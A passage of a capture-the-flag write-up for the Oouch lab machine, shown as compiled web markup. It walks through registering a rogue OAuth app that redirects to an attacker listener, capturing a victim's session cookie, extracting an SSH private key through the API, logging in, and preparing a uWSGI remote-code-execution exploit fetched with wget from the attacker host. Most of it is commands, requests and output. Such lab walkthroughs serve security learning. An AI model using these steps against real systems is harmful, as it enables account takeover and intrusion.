",(0,a.kt)("inlineCode",{parentName:"p"},"dev_access.txt"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"develop:supermegasecureklarabubu123! -> Allows application registration.\n")),(0,a.kt)("p",null,"We can now access the registration form:"),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/AlFb2X2.png",alt:null})),(0,a.kt)("p",null,"Let's try to register an app."),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Name: cyfunapp"),(0,a.kt)("li",{parentName:"ul"},"Client id: ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX"),(0,a.kt)("li",{parentName:"ul"},"Client secret: Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs"),(0,a.kt)("li",{parentName:"ul"},"Client type: Public"),(0,a.kt)("li",{parentName:"ul"},"Authorization grant type: Authorization code"),(0,a.kt)("li",{parentName:"ul"},"Redirect uris: ",(0,a.kt)("a",{parentName:"li",href:"http://10.10.15.142:8888/"},"http://10.10.15.142:8888/")," (attacker machine)")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/oauth/applications/2/"},"http://authorization.oouch.htb:8000/oauth/applications/2/")),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/hxMb6jf.png",alt:null})),(0,a.kt)("p",null,"Let's start a listener:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nc -nlvp 8888\n")),(0,a.kt)("p",null,"Now reading some ",(0,a.kt)("a",{parentName:"p",href:"https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm"},"Oracle documentation - Authenticate using OAuth 2.0")),(0,a.kt)("p",null,"We know we must request ",(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/oauth/authorize"},"http://authorization.oouch.htb:8000/oauth/authorize")," endpoint with some well known params."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"http://authorization.oouch.htb:8000/oauth/authorize?response_type=code&client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX&redirect_uri=http://10.10.15.142:8888/&grant_type=authorization_code&client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs\n")),(0,a.kt)("p",null,"Let's try this URL:"),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/KzULlvh.png",alt:null})),(0,a.kt)("p",null,"If we confirm the authorization we receive the Authorization Grant URL like earlier."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nc -nlvp 8888\nConnection from 10.10.15.142:41502\nGET /?code=68fq0Y8Anbh0Elid3ERKvrb9UCzsbO HTTP/1.1\nHost: 10.10.15.142:8888\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://authorization.oouch.htb:8000/oauth/authorize/?response_type=code&client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX&redirect_uri=http://10.10.15.142:8888/&grant_type=authorization_code&client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs\nConnection: close\nUpgrade-Insecure-Requests: 1\n")),(0,a.kt)("h3",{id:"2nd-oauth-exploitation"},"2nd oAuth exploitation"),(0,a.kt)("p",null,"Let's go back to the contact page (",(0,a.kt)("a",{parentName:"p",href:"http://consumer.oouch.htb:5000/contact"},"http://consumer.oouch.htb:5000/contact"),") and use the pseudo-SSRF to gain qtc access, not to the consumer site but to the provider site this time."),(0,a.kt)("p",null,"After a few minutes we receive the cookie of qtc:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nc -nlvp 8888\nConnection from 10.10.10.177:55806\nGET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1\nHost: 10.10.15.142:8888\nUser-Agent: python-requests/2.21.0\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nCookie: sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e;\n")),(0,a.kt)("p",null,"Let's request ",(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/"},"http://authorization.oouch.htb:8000/")," but with qtc's cookie."),(0,a.kt)("p",null,"We are now logged in as qtc:"),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/WOeWna9.png",alt:null})),(0,a.kt)("p",null,"As listed on the home page there is a token endpoint but it seems not reachable with GET, so let's try a POST (as explained in Oracle oAuth doc anyway). The doc also tells us which params to use."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'POST /oauth/token/ HTTP/1.1\nHost: authorization.oouch.htb:8000\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e; csrftoken=w8Q1tZ5XGQnYIfsjJMNksuQoCg5yYHOtkiWHEK2j8Xsu4ti75whbRr32oLBxC6bZ\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 223\n\ngrant_type=client_credentials&client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX&client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs```\n\nWe receive this error:\n\n```json\n{"error": "unauthorized_client"}\n')),(0,a.kt)("p",null,"So let's log as ",(0,a.kt)("inlineCode",{parentName:"p"},"cyfun2")," again, access the app params (",(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/oauth/applications/2/"},"http://authorization.oouch.htb:8000/oauth/applications/2/"),") and change ",(0,a.kt)("em",{parentName:"p"},"Authorization Grant Type")," to ",(0,a.kt)("inlineCode",{parentName:"p"},"client-credentials"),"."),(0,a.kt)("p",null,"Now we can spoof qtc cookie again and retry."),(0,a.kt)("p",null,"This time we obtain a much better answer:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "access_token": "Xkuzgir8C38MeCv2xyq08PFMDF5NwX",\n  "expires_in": 600,\n  "token_type": "Bearer",\n  "scope": "read write"\n}\n')),(0,a.kt)("h3",{id:"get-qtc-ssh-key"},"Get qtc SSH key"),(0,a.kt)("p",null,"Let's remember of ",(0,a.kt)("inlineCode",{parentName:"p"},"o_auth_notes.txt"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"/api/get_user -> user data. oauth/authorize -> Now also supports GET method.\n")),(0,a.kt)("p",null,"By using this endpoint we gain nothing:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"GET /api/get_user/?access_token=Xkuzgir8C38MeCv2xyq08PFMDF5NwX HTTP/1.1\nHost: authorization.oouch.htb:8000\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: csrftoken=34Evh3Q30RWq1vsa9yWKKc49TXMo3c2TNv96AXeKrL4qD3ZLf9JbDwzKtjRzFPn5; sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e\nUpgrade-Insecure-Requests: 1\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-json"},'{"username": "qtc", "firstname": "", "lastname": "", "email": "qtc@nonexistend.nonono"}\n')),(0,a.kt)("p",null,"As we heard of a ssh key in ",(0,a.kt)("inlineCode",{parentName:"p"},"todo.txt"),", let's try ",(0,a.kt)("inlineCode",{parentName:"p"},"get_ssh")," instead of ",(0,a.kt)("inlineCode",{parentName:"p"},"get_user"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"GET /api/get_ssh/?access_token=Xkuzgir8C38MeCv2xyq08PFMDF5NwX HTTP/1.1\nHost: authorization.oouch.htb:8000\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: csrftoken=34Evh3Q30RWq1vsa9yWKKc49TXMo3c2TNv96AXeKrL4qD3ZLf9JbDwzKtjRzFPn5; sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e\nUpgrade-Insecure-Requests: 1\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-json"},'{"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\\n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\\n-----END OPENSSH PRIVATE KEY-----"}\n')),(0,a.kt)("p",null,"So here is the private key of qtc:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAqQvHuKA1i28D1ldvVbFB8PL7ARxBNy8Ve/hfW/V7cmEHTDTJtmk7\nLJZzc1djIKKqYL8eB0ZbVpSmINLfJ2xnCbgRLyo5aEbj1Xw+fdr9/yK1Ie55KQjgnghNdg\nreZeDWnTfBrY8sd18rwBQpxLphpCR367M9Muw6K31tJhNlIwKtOWy5oDo/O88UnqIqaiJV\nZFDpHJ/u0uQc8zqqdHR1HtVVbXiM3u5M/6tb3j98Rx7swrNECt2WyrmYorYLoTvGK4frIv\nbv8lvztG48WrsIEyvSEKNqNUfnRGFYUJZUMridN5iOyavU7iY0loMrn2xikuVrIeUcXRbl\nzeFwTaxkkChXKgYdnWHs+15qrDmZTzQYgamx7+vD13cTuZqKmHkRFEPDfa/PXloKIqi2jA\ntZVbgiVqnS0F+4BxE2T38q//G513iR1EXuPzh4jQIBGDCciq5VNs3t0un+gd5Ae40esJKe\nVcpPi1sKFO7cFyhQ8EME2DbgMxcAZCj0vypbOeWlAAAFiA7BX3cOwV93AAAAB3NzaC1yc2\nEAAAGBAKkLx7igNYtvA9ZXb1WxQfDy+wEcQTcvFXv4X1v1e3JhB0w0ybZpOyyWc3NXYyCi\nqmC/HgdGW1aUpiDS3ydsZwm4ES8qOWhG49V8Pn3a/f8itSHueSkI4J4ITXYK3mXg1p03wa\n2PLHdfK8AUKcS6YaQkd+uzPTLsOit9bSYTZSMCrTlsuaA6PzvPFJ6iKmoiVWRQ6Ryf7tLk\nHPM6qnR0dR7VVW14jN7uTP+rW94/fEce7MKzRArdlsq5mKK2C6E7xiuH6yL27/Jb87RuPF\nq7CBMr0hCjajVH50RhWFCWVDK4nTeYjsmr1O4mNJaDK59sYpLlayHlHF0W5c3hcE2sZJAo\nVyoGHZ1h7Pteaqw5mU80GIGpse/rw9d3E7maiph5ERRDw32vz15aCiKotowLWVW4Ilap0t\nBfuAcRNk9/Kv/xudd4kdRF7j84eI0CARgwnIquVTbN7dLp/oHeQHuNHrCSnlXKT4tbChTu\n3BcoUPBDBNg24DMXAGQo9L8qWznlpQAAAAMBAAEAAAGBAJ5OLtmiBqKt8tz+AoAwQD1hfl\nfa2uPPzwHKZZrbd6B0Zv4hjSiqwUSPHEzOcEE2s/Fn6LoNVCnviOfCMkJcDN4YJteRZjNV\n97SL5oW72BLesNu21HXuH1M/GTNLGFw1wyV1+oULSCv9zx3QhBD8LcYmdLsgnlYazJq/mc\nCHdzXjIs9dFzSKd38N/RRVbvz3bBpGfxdUWrXZ85Z/wPLPwIKAa8DZnKqEZU0kbyLhNwPv\nXO80K6s1OipcxijR7HAwZW3haZ6k2NiXVIZC/m/WxSVO6x8zli7mUqpik1VZ3X9HWH9ltz\ntESlvBYHGgukRO/OFr7VOd/EpqAPrdH4xtm0wM02k+qVMlKId9uv0KtbUQHV2kvYIiCIYp\n/Mga78V3INxpZJvdCdaazU5sujV7FEAksUYxbkYGaXeexhrF6SfyMpOc2cB/rDms7KYYFL\n/4Rau4TzmN5ey1qfApzYC981Yy4tfFUz8aUfKERomy9aYdcGurLJjvi0r84nK3ZpqiHQAA\nAMBS+Fx1SFnQvV/c5dvvx4zk1Yi3k3HCEvfWq5NG5eMsj+WRrPcCyc7oAvb/TzVn/Eityt\ncEfjDKSNmvr2SzUa76Uvpr12MDMcepZ5xKblUkwTzAAannbbaxbSkyeRFh3k7w5y3N3M5j\nsz47/4WTxuEwK0xoabNKbSk+plBU4y2b2moUQTXTHJcjrlwTMXTV2k5Qr6uCyvQENZGDRt\nXkgLd4XMed+UCmjpC92/Ubjc+g/qVhuFcHEs9LDTG9tAZtgAEAAADBANMRIDSfMKdc38il\njKbnPU6MxqGII7gKKTrC3MmheAr7DG7FPaceGPHw3n8KEl0iP1wnyDjFnlrs7JR2OgUzs9\ndPU3FW6pLMOceN1tkWj+/8W15XW5J31AvD8dnb950rdt5lsyWse8+APAmBhpMzRftWh86w\nEQL28qajGxNQ12KeqYG7CRpTDkgscTEEbAJEXAy1zhp+h0q51RbFLVkkl4mmjHzz0/6Qxl\ntV7VTC+G7uEeFT24oYr4swNZ+xahTGvwAAAMEAzQiSBu4dA6BMieRFl3MdqYuvK58lj0NM\n2lVKmE7TTJTRYYhjA0vrE/kNlVwPIY6YQaUnAsD7MGrWpT14AbKiQfnU7JyNOl5B8E10Co\nG/0EInDfKoStwI9KV7/RG6U7mYAosyyeN+MHdObc23YrENAwpZMZdKFRnro5xWTSdQqoVN\nzYClNLoH22l81l3minmQ2+Gy7gWMEgTx/wKkse36MHo7n4hwaTlUz5ujuTVzS+57Hupbwk\nIEkgsoEGTkznCbAAAADnBlbnRlc3RlckBrYWxpAQIDBA==\n-----END OPENSSH PRIVATE KEY-----\n\n")),(0,a.kt)("h3",{id:"ssh-access-with-qtc"},"SSH Access with qtc"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ chmod 600 id_rsa\n$ ssh -i id_rsa qtc@oouch.htb\nLinux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue Feb 25 12:45:55 2020 from 10.10.14.3\nqtc@oouch:~$ cat user.txt \n2dea47702ee688171c4918703f46cb3c\n")),(0,a.kt)("h3",{id:"privilege-escalation--docker-credential-stuffing"},"Privilege Escalation : docker credential stuffing"),(0,a.kt)("p",null,"Let's see if there is a hint:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"qtc@oouch:~$ ls -lA\ntotal 28\nlrwxrwxrwx 1 root root    9 Feb 11 18:34 .bash_history -> /dev/null\n-rw-r--r-- 1 qtc  qtc   220 Feb 11 18:11 .bash_logout\n-rw-r--r-- 1 qtc  qtc  3526 Feb 11 18:11 .bashrc\ndrwx------ 3 qtc  qtc  4096 Feb 25 12:45 .gnupg\n-rw-r--r-- 1 root root   55 Feb 11 18:34 .note.txt\n-rw-r--r-- 1 qtc  qtc   807 Feb 11 18:11 .profile\ndrwx------ 2 qtc  qtc  4096 Feb 11 18:34 .ssh\n-rw------- 1 qtc  qtc    33 Jun 30 10:00 user.txt\nqtc@oouch:~$ cat .note.txt \nImplementing an IPS using DBus and iptables == Genius?\n")),(0,a.kt)("p",null,"Let's see about dbus process:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ps -ef f | grep dbus\nroot      2688     1  0 09:59 ?        Ss     0:00 /root/dbus-server\nmessage+  2690     1  0 09:59 ?        Ss     0:02 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\n")),(0,a.kt)("p",null,"Let's check a dbus trick on ",(0,a.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus"},"hacktricks"),":"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"/etc/dbus-1/system.d/htb.oouch.Block.conf")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-xml"},'<?xml version="1.0" encoding="UTF-8"?> \x3c!-- -*- XML -*- --\x3e\n\n<!DOCTYPE busconfig PUBLIC\n "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"\n "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">\n\n<busconfig>\n\n    <policy user="root">\n        <allow own="htb.oouch.Block"/>\n    </policy>\n\n        <policy user="www-data">\n                <allow send_destination="htb.oouch.Block"/>\n                <allow receive_sender="htb.oouch.Block"/>\n        </policy>\n\n</busconfig>\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"www-data")," can receive and send message from dbus."),(0,a.kt)("p",null,"Let's find something else."),(0,a.kt)("p",null,"As docker is running let's see the address ranges:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ qtc@oouch:~$ ip addr show docker0 \n3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default \n    link/ether 02:42:a1:27:4b:76 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n       valid_lft forever preferred_lft forever\n")),(0,a.kt)("p",null,"By looking at running process we should be able to find machines in ",(0,a.kt)("inlineCode",{parentName:"p"},"172.17.0.1/16")," range."),(0,a.kt)("p",null,"The Django and Flask app are running on docker containers:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ps -ef f\n...\nroot      3110     1  0 09:59 ?        Ssl    0:28 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock\nroot      3567  3110  0 10:00 ?        Sl     0:00  \\_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.18.0.3 -container-port 5000\nroot      3618  3110  0 10:00 ?        Sl     0:00  \\_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8000 -container-ip 172.18.0.4 -container-port 8000\n...\n")),(0,a.kt)("p",null,"It seems we can connect on the customer Flask app host:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"qtc@oouch:~$ ssh -i id_rsa qtc@172.18.0.3\nWarning: Identity file id_rsa not accessible: No such file or directory.\nLinux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue Jun 30 20:04:54 2020 from 172.18.0.1\nqtc@aeb4525789d8:~$\n")),(0,a.kt)("p",null,"There is a ",(0,a.kt)("inlineCode",{parentName:"p"},"/code")," folder:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"qtc@aeb4525789d8:/code$ ls -lh\ntotal 44K\n-rw-r--r-- 1 root root 1.1K Feb 11 17:34 Dockerfile\n-r-------- 1 root root  568 Feb 11 17:34 authorized_keys\n-rw-r--r-- 1 root root  325 Feb 11 17:34 config.py\n-rw-r--r-- 1 root root   23 Feb 11 17:34 consumer.py\n-r-------- 1 root root 2.6K Feb 11 17:34 key\ndrwxr-xr-x 4 root root 4.0K Feb 11 17:34 migrations\n-rw-r--r-- 1 root root  724 Feb 11 17:34 nginx.conf\ndrwxr-xr-x 5 root root 4.0K Feb 11 17:34 oouch\n-rw-r--r-- 1 root root  241 Feb 11 17:34 requirements.txt\n-rwxr-xr-x 1 root root   89 Feb 11 17:34 start.sh\n-rw-rw-rw- 1 root root    0 Jun 30 20:07 urls.txt\n-rw-r--r-- 1 root root  163 Feb 11 17:34 uwsgi.ini\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"start.sh"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"#!/bin/bash\nservice ssh start\nservice nginx start\nuwsgi --ini uwsgi.ini --chmod-sock=666\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"uwsgi.ini")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-ini"},"[uwsgi]\nmodule = oouch:app\nuid = www-data\ngid = www-data\nmaster = true\nprocesses = 10\nsocket = /tmp/uwsgi.socket\nchmod-sock = 777\nvacuum = true\ndie-on-term = true\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"www-data")," owns uwsgi."),(0,a.kt)("h3",{id:"uwsgi-exploitation"},"UWSGI exploitation"),(0,a.kt)("p",null,"Let's check that uwsgi runs as www-data and is in a vulnerable version."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"qtc@aeb4525789d8:~$ ps -ef | grep uwsgi\nwww-data    31     1  0 08:00 ?        00:00:05 uwsgi --ini uwsgi.ini --chmod-sock=666\nwww-data    32    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666\nwww-data    33    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666\nwww-data    34    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666\nwww-data    35    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666\nwww-data    36    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666\nwww-data    37    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666\nwww-data    38    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666\nwww-data    39    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666\nwww-data    40    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666\nwww-data    41    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666\nqtc        140    90  0 22:06 pts/0    00:00:00 grep uwsgi\nqtc@aeb4525789d8:~$ uwsgi --version\n2.0.17.1\n")),(0,a.kt)("p",null,"I found an RCE exploit on github: ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py"},"https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py")),(0,a.kt)("p",null,"We need a quick patch, on line 18-19 in ",(0,a.kt)("inlineCode",{parentName:"p"},"sz()"),", remove or comment the if statements."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-diff"},"def sz(x):\n    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')\n-   if sys.version_info[0] == 3: import bytes\n+   #if sys.version_info[0] == 3: import bytes\n-   s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex')\n+   s = bytes.fromhex(s) #if sys.version_info[0] == 3 else s.decode('hex')\n    return s[::-1]\n")),(0,a.kt)("p",null,"Start a web server from you attacker machine."),(0,a.kt)("p",null,"On oouch machine retrieve the uwsgi exploit."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cd /tmp\n$ wget http://10.10.15.142:8000/uwsgi_exp.py\n")),(0,a.kt)("p",null,"Now we need to transfer then into the docker container but there aren't many binaries inside. So we will have to use a 